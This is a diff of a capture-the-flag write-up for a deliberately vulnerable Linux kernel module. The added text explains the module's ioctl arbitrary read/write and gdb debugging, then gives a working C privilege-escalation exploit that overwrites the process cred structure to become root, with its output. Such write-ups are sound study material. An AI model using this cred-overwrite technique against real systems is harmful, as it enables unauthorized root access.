@@ -324,235 +324,65 @@ Command line: console=ttyS0 init='/init'
 uid=0(root) gid=0(root)
 ```
 
-Oh, we are root as well! Well yes, baceuse init script runs with root privilages. Of course this won't be possible on challenge server where we cannot modify `./run.sh` file. But it is a good idea to modify init localy and log in as root as we gain access to useful debugging stuff like: dmesg, /proc/kallsyms, etc.
+Oh, we are root as well! Well yes, bacause init script runs with root privilages. Of course this won't be possible on challenge server where we cannot modify `./run.sh` file. But it is a good idea to modify init localy and log in as root as we gain access to useful debugging stuff like: dmesg, /proc/kallsyms, etc.
 
-Before we run ./client_kernel_baby_2 let's downgrade our permissions for a moment to become user.
-Now let's run ./client_kernel_baby_2:
+## Changing lab setting
+As at the time of writing there is no working netcat server I will write an exploit in c which will directly exploit the kernel module without touching the `client_kernel_baby_2`. This won't spoil the task, but simulate real privilage escalation from user to root account. Of course we need to change the setup for this. Just change permissions of /dev/flux_baby_2 inside init file, so that user can execute it.
 
-```console
-# su user
-$ id
-uid=1000(user) gid=1000(user) groups=1000(user)
-
-$ ./client_kernel_baby_2
-flux_baby_2 opened
------ Menu -----
-1. Read
-2. Write
-3. Show me my uid
-4. Read file
-5. Any hintz?
-6. Bye!
-> 4
-Which file are we trying to read?
-> /etc/passwd
-Here are your 0x47 bytes contents: 
-root:x:0:0:root:/root:/bin/sh
-user:x:1000:1000:user:/home/user:/bin/sh
------ Menu -----
-1. Read
-2. Write
-3. Show me my uid
-4. Read file
-5. Any hintz?
-6. Bye!
-> 4
-> /flag
-Could not open file for reading...
------ Menu -----
-1. Read
-2. Write
-3. Show me my uid
-4. Read file
-5. Any hintz?
-6. Bye!
-> 3
-uid=1000(user) gid=1000(user) groups=1000(user)
------ Menu -----
-1. Read
-2. Write
-3. Show me my uid
-4. Read file
-5. Any hintz?
-6. Bye!
-> 1
-I need an address to read from. Choose wisely
-> 
-0
-Got everything I need. Let's do it!
-flux_baby_2 ioctl nr 901 called
-BUG: unable to handle kernel NULL pointer dereference at 0000000000000000
-PGD 33c3067 P4D 33c3067 PUD 33c2067 PMD 0 
-Oops: 0000 [#1] PREEMPT NOPTI
-CPU: 0 PID: 62 Comm: client_kernel_b Tainted: G           O      4.19.77 #2
-RIP: 0010:read+0x2a/0x40 [kernel_baby_2]
-Code: 55 48 89 fe ba 10 00 00 00 48 89 e5 48 83 ec 18 48 8d 7d f0 e8 07 64 11 e1 48 8b 45 f0 48 8b 7d f8 48 8d 75 e8 ba 08 00 00 00 <48> 8b 00 48 89 45 e8 e8 ba 63 11 e1 31 c0 c9 c3 66 0f 1f 44 00 00
-RSP: 0018:ffffc900000c7e18 EFLAGS: 00000246
-RAX: 0000000000000000 RBX: 0000000000000385 RCX: 0000000000000000
-RDX: 0000000000000008 RSI: ffffc900000c7e18 RDI: 00007fff7ebc06b8
-RBP: ffffc900000c7e30 R08: 00007fff7ebc06b8 R09: 00000000000000da
-R10: 0000000000000007 R11: 0000000000000000 R12: 00007fff7ebc0670
-R13: ffff88800349bc00 R14: 00007fff7ebc0670 R15: ffff88800338c400
-FS:  0000000001ac2880(0000) GS:ffffffff81836000(0000) knlGS:0000000000000000
-CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-CR2: 0000000000000000 CR3: 00000000033c0000 CR4: 00000000005406b0
-PKRU: 55555554
-Call Trace:
- driver_ioctl+0x52/0xf2e [kernel_baby_2]
- do_vfs_ioctl+0x414/0x620
- ksys_ioctl+0x3c/0x80
- ? ksys_write+0x4a/0xc0
- __x64_sys_ioctl+0x15/0x20
- do_syscall_64+0x44/0x1c0
- entry_SYSCALL_64_after_hwframe+0x44/0xa9
-RIP: 0033:0x4502eb
-Code: 0f 97 c0 84 c0 75 b0 49 8d 3c 1c e8 1f 4c 03 00 85 c0 78 b1 48 83 c4 08 4c 89 e0 5b 41 5c c3 f3 0f 1e fa b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
-RSP: 002b:00007fff7ebc0648 EFLAGS: 00000246 ORIG_RAX: 0000000000000010
-RAX: ffffffffffffffda RBX: 00000000004004a0 RCX: 00000000004502eb
-RDX: 00007fff7ebc0670 RSI: 0000000000000385 RDI: 0000000000000003
-RBP: 00007fff7ebc0690 R08: 0000000000000024 R09: 7265766520746f47
-R10: 4920676e69687479 R11: 0000000000000246 R12: 00000000004032b0
-R13: 0000000000000000 R14: 00000000004ca018 R15: 0000000000000000
-Modules linked in: kernel_baby_2(O)
-CR2: 0000000000000000
----[ end trace db070858655dba27 ]---
-RIP: 0010:read+0x2a/0x40 [kernel_baby_2]
-Code: 55 48 89 fe ba 10 00 00 00 48 89 e5 48 83 ec 18 48 8d 7d f0 e8 07 64 11 e1 48 8b 45 f0 48 8b 7d f8 48 8d 75 e8 ba 08 00 00 00 <48> 8b 00 48 89 45 e8 e8 ba 63 11 e1 31 c0 c9 c3 66 0f 1f 44 00 00
-RSP: 0018:ffffc900000c7e18 EFLAGS: 00000246
-RAX: 0000000000000000 RBX: 0000000000000385 RCX: 0000000000000000
-RDX: 0000000000000008 RSI: ffffc900000c7e18 RDI: 00007fff7ebc06b8
-RBP: ffffc900000c7e30 R08: 00007fff7ebc06b8 R09: 00000000000000da
-R10: 0000000000000007 R11: 0000000000000000 R12: 00007fff7ebc0670
-R13: ffff88800349bc00 R14: 00007fff7ebc0670 R15: ffff88800338c400
-FS:  0000000001ac2880(0000) GS:ffffffff81836000(0000) knlGS:0000000000000000
-CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-CR2: 0000000000000000 CR3: 00000000033c0000 CR4: 00000000005406b0
-PKRU: 55555554
-flux_baby_2 closed
-Killed
-```
-
-The program let's us to:
-- check our id,
-- read a file: we first read /etc/passwd and then /flag file. As expected we can read /etc/passwd but as a user we don't have enough permissions to read a /flag file.
-- perform read operation,
-- perform write operation
-
-We can guess that we have to use read & write operations to escalate our privilages to root to read a /flag file.
-We also saw that when trying to perform read operation we got a kernel panic message Oops with: 
-`BUG: unable to handle kernel NULL pointer dereference` message. It means that kernel tried to access/write on invalid memory. More informations we can get from 000 which are in `Oops: 0000 [#1] PREEMPT NOPTI` message. They are defined [here](https://elixir.bootlin.com/linux/latest/source/arch/x86/include/asm/traps.h#L167) as:
+Now let's open `kernel_baby_2` in Ghidra. There is no main functio n this time. To understand how we can communicate with the char device we must look at `file_operations` structure. Each char device has assosiated `file_operations` structure.
 
 ```c
-//  arch/x86/mm/fault.c
-/*
- * Page fault error code bits:
- *
- *   bit 0 ==    0: no page found   1: protection fault
- *   bit 1 ==    0: read access     1: write access
- *   bit 2 ==    0: kernel-mode access  1: user-mode access
- *   bit 3 ==               1: use of reserved bit detected
- *   bit 4 ==               1: fault was an instruction fetch
- */
- ```
-
-So in our case we can read our kernel panic as:
-"Kernel tried to read a page that could not be found".
-Besides that we have all registers states and call trace.
-
-But let's not be guessing to much and let's open `client_kernel_baby_2` under Ghidra. We want to check what caused a kernel panic.
-
-We start with reconstructing main:
-
-```c
-int main()
-{
-  int fd;
-  uint *puVar1;
-  ulong cmd;
-  
-  fd = open("/dev/flux_baby_2" ,0); // [0]
-  do {
-    menu();
-    cmd = read_num(); // [1]
-    switch(cmd) {
-    default:
-      puts("Did not understand your input...");
-      return 0;
-    case 1:
-      do_read(fd); // [2]
-      break;
-    case 2:
-      do_write(fd);
-      break;
-    case 3:
-      system("id");
-      break;
-    case 4:
-      do_readfile();
-      break;
-    case 5:
-      do_hint();
-      break;
-    case 6:
-      close(fd);
-      puts("Bye!");
-      return 0;
-    }
-  } while( true );
-}
-```
-
-The program:
-- [0] starts with opening a `/dev/flux_baby_2` char device
-- [1] reads user command
-- [2] in our case it executes do_read(fd)
-
-So let's check `do_read`:
-
-```c
-void do_read(int fd) {
-  void* read_to;
-  void *read_from_addr;
-  
-  read_to = 0xdeadbeefdeadbeef;
-  
-  puts("I need an address to read from. Choose wisely\n> ");
-  read_from_addr = read_num();
-  
-  puts("Got everything I need. Let\'s do it!");
-  ioctl_read(fd,read_from_addr,&read_to);
-  
-  printf("We\'re back. Our scouter says the power level is: %016lx\n",read_to);
-  
-  return;
-}
-```
-
-it is very simple. It asks user for an address he wants to read from and ivokes ioctl_read():
-
-```c
-#define READ_CMD 0x385
-
-struct read_arg_t {
-  void* from;
-  void* to;
+struct file_operations {
+  [...]
+  loff_t (*llseek) (struct file *, loff_t, int);
+  ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
+  ssize_t (*write) (struct file *, const char __user *, size_t,
+      loff_t *);
+  int (*unlocked_ioctl) (struct file *, unsigned int,
+      unsigned long);
+  int (*compat_ioctl) (struct file *, unsigned int,
+      unsigned long);
+  int (*open) (struct inode *, struct file *);
+  int (*release) (struct inode *, struct file *);
+  [...]
 };
+```
 
-void ioctl_read(int fd, void *read_from_addr, void *read_to) {
-  struct read_arg_t read_arg;
-  read_arg->from = read_from_addr;
-  read_arg->to = read_to;
+One can treat it as polimirphism in c. The function pointed as `open` must handle `open` operation that user has called on a file descriptor related to this char device. It usually just allocated some structures needed for later operation. `release` handles `close` (this is more complicated, as in fact it handles situation when references drop to 0) and usually just cleans all allocated structures.
+Then we have `read`, `write`, `llseek`. Not every char device must implement them all. `read` for example should handle functions such as `read`, `pread`, `readv` invoked by user on this char device.
+Finally we have: `unlocked_ioctl` and `compat_ioctl`. Often they point to same function. The only difference is that `compat_ioctl` should be 32 bit compatibile.
 
-  ioctl(fd, READ_CMD, &read_arg);
+In `kernel_baby_2` we have:
+
+```c
+struct file_operations flux_operation {
+  [...]
+  .open             = driver_open,
+  .release          = driver_close,
+  .compat_ioctl     = driver_ioctl,
+  .unlocked_ioctl   = driver_ioctl,
+  [...]
+```
+
+So let's check what they do. 
+
+```c
+int driver_open(struct inode ind*, struct file flip*) {
+  printk("flux_baby_2 opened\n");
+  return 0;
+}
+
+int driver_close(struct inode ind*, struct file flip*) {
+  printk("flux_baby_2 closed\n");
+  return 0;
 }
 ```
 
-Ok, so all `client_kernel_baby_2` did was to retrieve an address a user wants to read from and then invoked `ioctl` on `/dev/flux_baby_2`.
-The second argument to ioctl is a cmd. The convension is that ioctl is just a switch based on required cmd argument. 
+So open and release just print debug informations nothing more:) Let's  check `driver_ioctl` function:
 
-Now let's open `kernel_baby_2` in Ghidra to follow the flow:
 
 ```c
+// simplified! Created write function as it was inlined.
 #define READ_CMD 0x385
 #define WRITE_CMD 0x386
 
@@ -566,16 +396,17 @@ struct write_arg_t {
   void* val;
 };
 
+
 long driver_ioctl(struct file *flip_1, ulong cmd, ulong arg) {
   printk("flux_baby_2 ioctl nr %d called\n", cmd);
 
   switch (cmd) {
     case READ_CMD:
-      dread((struct read_arg_t*) arg);
+      read((struct read_arg_t*) arg);
       break;
 
     case WRITE_CMD:
-      dwrite((struct write_arg_t*) arg);
+      write((struct write_arg_t*) arg);
       break;
   }
 
@@ -583,12 +414,12 @@ long driver_ioctl(struct file *flip_1, ulong cmd, ulong arg) {
 }
 ```
 
-So as I've mentioned above, the ioctl is a one big switch depending on a cmd. The arg argument is usually a pointer to other arguents. In case of READ_CMD it is a `struct read_arg_t *` and in case of WRITE_CMD is is a `struct write_arg_t *`.
+So ioctl is a big switch depending on a provided cmd parameter. The arg argument is usually a pointer to argument structure. In case of READ_CMD it is a `struct read_arg_t *` and in case of WRITE_CMD is is a `struct write_arg_t *`.
 
-As we are still trying to understand why kernel panic occured, we need to check `dread` function:
+Let's first check `read` function. If you follow this task and you use Ghidra then change the function signature as Ghidra will think this is a standard `ssize_t read(int fd, char* buf, size_t count)` function.
 
 ```c
-void dread(struct read_arg_t *read_arg) {
+void read(struct read_arg_t *read_arg) {
   struct read_arg_t read_arg_kernel;
   unsigned long val;
   
@@ -602,11 +433,7 @@ void dread(struct read_arg_t *read_arg) {
 
 copy_from_user and copy_to_user are standard kernel functions. When you are writing kernel code you must not access user data directly at it could lead to serious security issues. So in [0] kernel just copies the user argument to his own local variable `read_arg_kernel`. Then in [1] kernel reads a value under address a user specified and finaly in [2] he copies this value back to userspace.
 
-As we have provided value 0 the kernel tried in [1] to read a value under this address and of course this is an invalid instruction which caused kernel panic.
-
 Hmm, but this means that we can read values at any address we want! Not only from user but also from kernel space! This is for sure a big security issue which we will take advantage of!
-
-As at the time of writing there is no working netcat server I will write an exploit in c which will directly exploit the kernel module without touching the `client_kernel_baby_2`. This won't spoil the task, but simulate real privilage escalation from user to root account. Of course we need to change the setup for this. Just change permissions of /dev/flux_baby_2 inside init file.
 
 Let's implement a general function for reading an address by using ioctl function of /dev/flux_baby char device:
 
@@ -664,10 +491,10 @@ fail:
 }
 ```
 
-Reading address of our choice gives as a lot of power, but won't be enough. This means that we need to find something more. Let's check second command implementation which is `dwrite`:
+Reading address of our choice gives as a lot of power, but won't be enough. This means that we need to find something more. Let's check second command implementation which is `write`:
 
 ```c
-void dwrite(struct write_arg_t *write_arg) {
+void write(struct write_arg_t *write_arg) {
   struct write_arg_t write_arg_kernel;
 
   _copy_from_user(&write_arg, write_arg, sizeof(struct write_arg_t));
@@ -754,9 +581,9 @@ fail:
 }
 ```
 
-Now the question is. What can we do having arbitrary read and write? We still do not control $rip, but do we have to? No. As you can read in [here](https://github.com/kscieslinski/CTF/tree/master/notes/permissions#kernel-structures--capabilities) kernel allocated struct task_struct for each process. This structure keeps most relevant informations about a process. One of the informations is a pointer to `cred` structure. In the `cred` structure we have field such as: `uid`, `guid`, `suid`, `sgid` etc. We all know that root has all those fields set to 0, and our unprivilaged user has them set to 1000. So what we can actually do is to set them to 0. All we need to get is an address of those fields!
+Now the question is. What can we do having arbitrary read and write? We still do not control $rip, but do we have to? No. As you can read in [here](https://github.com/kscieslinski/CTF/tree/master/notes/permissions#kernel-structures--capabilities) kernel allocated struct task_struct for each process. This structure keeps most relevant informations about a process. One of the informations is a pointer to `cred` structure. In the `cred` structure we have fields such as: `uid`, `guid`, `suid`, `sgid` etc. We all know that root has all those fields set to 0, and our unprivilaged user has them set to 1000. So what we can actually do is to set them to 0. (this should be enough to read a flag, but some actions might still be not allowed for us, because kernel uses mostly capabilities and not ids to check if some action should be permited). All we need to get is an address of those fields!
 
-You can imagine that kernel developers quite often need to access informations about a current process. And so there is a great global variable:
+You can imagine that kernel developers quite often need to access informations about a current process. And so there is a very helpful global variable:
 
 `struct task_struct *current_task;`
 
@@ -764,8 +591,6 @@ which points to a task_struct of a current process. As there is no KASLR enabled
 
 ```console
 $ egrep "current_task" System.map
-ffffffff816d4df0 r __ksymtab_current_task
-ffffffff816db115 r __kstrtab_current_task
 ffffffff8183a040 D current_task
 ```
 
@@ -776,7 +601,6 @@ Cool! But this is just an address of a pointer. What we need is an address of a 
 int escalate() {
     int err;
     u_int64_t current;
-    u_int64_t current_creds;
 
     err = driver_read(&current, CURRENT_TASK_ADDR);
     if (err < 0) {
@@ -803,6 +627,255 @@ int main() {
     close(fd);
     [...]
 }
+```
+
+## Upload exploit
+We can now test it out. But I havn't mentioned how to upload exploit on a target machine. I've spent a lot of time trying to setup scp or a shared folder between host and guest which does not make any sense. The linux vms provided in task are really light and so they don't have gcc nor network card. I prefer to compile exploit localy (staticaly!) and then place it in initramfs.cpio.gz. Of course you cannot do this on a challenge server. If you need to transport final exploit to challenge server you can compile it localy and then base64 encode it,  copy paste it and finaly base64 decode it.
+
+```console
+$ cd exported
+$ gcc exploit.c -o exploit --static
+$ find . -print0 | cpio --null -ov --format=newc | gzip -9 >../initramfs.cpio.gz
+[...]
+$ ./run.sh
+[...]
+$ ./exploit
+flux_baby_2 opened
+[+] Opened device /dev/flux_baby_2, fd assigned: 3
+flux_baby_2 ioctl nr 901 called
+[+] Copied 8 bytes from: 0xffffffff8183a040, to: 0x7fffc87ee300
+[+] Leaked address of current: 0xffff888000114600
+flux_baby_2 closed
+```
+
+## gdb
+0xffff888000114600 is a valid kernel address as kernel space range is [0xffff880000000000-0xffffffffffffffff] and so it seems that we successfully leaked current process task_struct address. Now we have to find offset of cred field as again we would like to get a structure address.
+
+Now it is a right time to use gdb! We will want to breakpoint on read instruction, so we need to determinate the address. We cannot use System.map this time as it doesn't contain modules symbols. But this is good as we will learn more techniques! Just load module (init does it for us) and check it's address in /proc/kallsyms:
+
+```console
+# cat /proc/kallsyms  | grep baby
+ffffffffa0001024 r _note_6	[kernel_baby_2]
+ffffffffa0002388 b devt	[kernel_baby_2]
+ffffffffa0002380 b cdev	[kernel_baby_2]
+ffffffffa0002000 d fops	[kernel_baby_2]
+ffffffffa0002380 b __key.35767	[kernel_baby_2]
+ffffffffa0002100 d __this_module	[kernel_baby_2]
+ffffffffa000007c t driver_close	[kernel_baby_2]
+ffffffffa0000090 t driver_read	[kernel_baby_2]
+ffffffffa0000040 t write	[kernel_baby_2]
+ffffffffa0000000 t read	[kernel_baby_2] // <-- break here
+ffffffffa00000d2 t driver_ioctl	[kernel_baby_2]
+ffffffffa0000068 t driver_open	[kernel_baby_2]
+```
+
+First you need to add `-s -S` options to `run.sh` script:
+
+```bash
+#!/bin/sh
+
+DIR="$(dirname "$(readlink -f "$0")")"
+qemu-system-x86_64 -monitor /dev/null \
+    -cpu max,+smap,+smep,check \
+    -m 64 -nographic \
+    -kernel "$DIR/bzImage" \
+    -initrd "$DIR/initramfs.cpio.gz" \
+    -append "console=ttyS0 init='/init'" \
+    -s -S
+```
+
+The `-s` option will tell qemu to open gdbserver on port 1234, while `-S` will tell qemu not to start before we will attach to it.
+
+In first console tab run update `run.sh`:
+
+```c
+$ ./run.sh
+```
+
+And in second tab run gdb. Run it on vmlinux to load all symbols! See, it is quite useful! Then we connect to our vm with `target remote :1234` command. And now we can set breakpoints. Note that before linux boots you can use only hardware breakpoints as it hasn't yet loaded exception handling needed for software ones. 
+
+```gdb
+$ gdb vmlinux
+gef➤  target remote :1234
+gef➤  hb  *0xffffffffa0000000
+gef➤  c
+Continuing.
+
+```
+
+Now we have to run our exploit in first tab.
+
+```console
+$ ./exploit
+flux_baby_2 opened
+[+] Opened device /dev/flux_baby_2, fd assigned: 3
+flux_baby_2 ioctl nr 901 called
+```
+
+And back to tab with gdb where we should have hit a breakpoint. Examine the address of current_task, current_task.cred and continue to double check that we found a correct address of current_task.
+
+```console
+Breakpoint 1, 0xffffffffa0000000 in ?? ()
+gef➤  p &current_task
+$1 = (struct task_struct **) 0xffffffff8183a040 <current_task>
+gef➤  p current_task
+$2 = (struct task_struct *) 0xffff888002c41180
+gef➤  p &current_task.cred
+$3 = (const struct cred *) 0xffff888002c41580
+gef➤  c
+```
+
+In first tab we should see this output:
+
+```console
+/ $ ./exploit
+flux_baby_2 opened
+[+] Opened device /dev/flux_baby_2, fd assigned: 3
+flux_baby_2 ioctl nr 901 called
+[+] Copied 8 bytes from: 0xffffffff8183a040, to: 0x7ffdf70768b0
+[+] Leaked address of current: 0xffff888002c41180
+```
+
+See, the address of current is as we expected! Now let's check the offset of cred pointer:
+
+0xffff888002c41580 - 0xffff888002c41180 = 0x400
+
+and update our escalate function to leak it:
+
+```c
+#define COPY_REQUEST 0x385
+#define WRITE_REQUEST 0x386
+
+#define CURRENT_TASK_ADDR ((void*) 0xffffffff8183a040)
+
+#define EFF_CRED_TASK_STRUCT_OFST 0x400
+
+int escalate() {
+    int err;
+    u_int64_t current;
+    u_int64_t current_creds;
+
+    err = driver_read(&current, CURRENT_TASK_ADDR);
+    if (err < 0) {
+        perror("[-] leak address of current\n");
+        goto fail;
+    }
+    printf("[+] Leaked address of current: %p\n", current);
+
+    err = driver_read(&current_creds, current + EFF_CRED_TASK_STRUCT_OFST);
+    if (err < 0) {
+        perror("[-] current creds addr\n");
+        goto fail;
+    }
+    printf("[+] Leaked current_creds address: %p\n", current_creds);
+}
+```
+
+You can now run it. The output should be:
+
+```console
+flux_baby_2 opened
+[+] Opened device /dev/flux_baby_2, fd assigned: 3
+flux_baby_2 ioctl nr 901 called
+[+] Copied 8 bytes from: 0xffffffff8183a040, to: 0x7ffdf70768b0
+[+] Leaked address of current: 0xffff888002c41180
+flux_baby_2 ioctl nr 901 called
+[+] Copied 8 bytes from: 0xffff888002c41578, to: 0x7ffdf70768b8
+[+] Leaked current_creds address: 0xffff888002c5d180
+```
+
+Ok, so we have exact address of current_creds. Now let's use arbitrary write to overwrite creds. We will overwrite `uid`, `gid`, `suid`, ..., `fsgid` of struct cred.
+
+```c
+struct cred {
+  atomic_t	usage;
+	kuid_t		uid;		/* real UID of the task */
+	kgid_t		gid;		/* real GID of the task */
+	kuid_t		suid;		/* saved UID of the task */
+	kgid_t		sgid;		/* saved GID of the task */
+	kuid_t		euid;		/* effective UID of the task */
+	kgid_t		egid;		/* effective GID of the task */
+	kuid_t		fsuid;		/* UID for VFS ops */
+	kgid_t		fsgid;		/* GID for VFS ops */
+  [...]
+};
+```
+
+Our update exploit. I've added system("id") call to observe the escalation. Of course run this script as a user.
+
+```c
+#define COPY_REQUEST 0x385
+#define WRITE_REQUEST 0x386
+
+#define CURRENT_TASK_ADDR ((void*) 0xffffffff8183a040)
+
+#define EFF_CRED_TASK_STRUCT_OFST 0x400
+#define UID_CRED_OFST 0x4
+#define FSGID_CRED_OFST 0x20
+
+/* Escalate process privilages by overwriting current_task->cred->uid */
+int escalate() {
+    int err;
+    u_int64_t current;
+    u_int64_t current_creds;
+
+    err = driver_read(&current, CURRENT_TASK_ADDR);
+    if (err < 0) {
+        perror("[-] leak address of current\n");
+        goto fail;
+    }
+    printf("[+] Leaked address of current: %p\n", current);
+
+    err = driver_read(&current_creds, current + EFF_CRED_TASK_STRUCT_OFST);
+    if (err < 0) {
+        perror("[-] current creds addr\n");
+        goto fail;
+    }
+    printf("[+] Leaked current_creds address: %p\n", current_creds);
+
+    printf("[i] Before overwriting current->cred structure our process id is user:\n");
+    system("id;");
+    for (size_t ofst = UID_CRED_OFST; ofst <= FSGID_CRED_OFST; ofst += 0x8) {
+        err = driver_write(current_creds + ofst, 0);
+        if (err < 0) {
+            perror("[-] Failed to overwrite creds\n");
+            goto fail;
+        }
+    }
+    printf("[i] After overwriting current->cred structure our process id shoud be root:\n");
+    system("id; cat /flag");
+
+    return 0;
+fail:
+    return -1;
+}
+```
+
+The output:
+
+```console
+flux_baby_2 opened
+[+] Opened device /dev/flux_baby_2, fd assigned: 3
+flux_baby_2 ioctl nr 901 called
+[+] Copied 8 bytes from: 0xffffffff8183a040, to: 0x7ffdf70768b0
+[+] Leaked address of current: 0xffff888002c41180
+flux_baby_2 ioctl nr 901 called
+[+] Copied 8 bytes from: 0xffff888002c41578, to: 0x7ffdf70768b8
+[+] Leaked current_creds address: 0xffff888002c5d180
+[i] Before overwriting current->cred structure our process id is user:
+uid=1000(user) gid=1000(user) groups=1000(user)
+flux_baby_2 ioctl nr 902 called
+[+] Set value under address: 0xffff888002c5d184 to val: 0
+flux_baby_2 ioctl nr 902 called
+[+] Set value under address: 0xffff888002c5d18c to val: 0
+flux_baby_2 ioctl nr 902 called
+[+] Set value under address: 0xffff888002c5d194 to val: 0
+flux_baby_2 ioctl nr 902 called
+[+] Set value under address: 0xffff888002c5d19c to val: 0
+[i] After overwriting current->cred structure our process id shoud be root:
+uid=0(root) gid=0(root) groups=1000(user)
+flag{fake_flag}
+flux_baby_2 closed
 ```
 
 
